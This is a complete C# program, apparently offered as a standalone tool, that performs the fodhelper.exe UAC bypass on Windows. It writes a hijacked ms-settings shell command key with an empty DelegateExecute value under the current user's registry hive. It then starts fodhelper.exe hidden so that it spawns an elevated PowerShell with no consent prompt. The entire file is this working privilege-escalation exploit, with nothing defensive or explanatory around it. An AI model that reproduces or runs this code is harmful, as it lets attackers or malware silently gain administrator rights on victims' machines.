using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FodHelper
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //to clear the exploit 
            //New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
            //exploit function
            UAC("cmd.exe /c start powershell.exe");
        }

        static void UAC(string Comamnd)
        {
            string registryPath = @"Software\Classes\ms-settings\Shell\Open\command";
            string program = Comamnd; //cmd /c start powershell.exe

            RegistryKey keys = Registry.CurrentUser.CreateSubKey(registryPath);
            keys.Close();

            Registry.SetValue($"HKEY_CURRENT_USER\\{registryPath}", "DelegateExecute", "", RegistryValueKind.String);
            //Registry.SetValue($"HKEY_CURRENT_USER\\{registryPath}", "(Default)", program, RegistryValueKind.String);
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath, true))
            {
                if (key != null)
                {
                    key.SetValue("", program);
                    Console.WriteLine("(Default) value has been set successfully.");
                }
                else
                {
                    Console.WriteLine("Registry key not found.");
                }
            }

            //
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\fodhelper.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process.Start(startInfo);
        }
    }
}
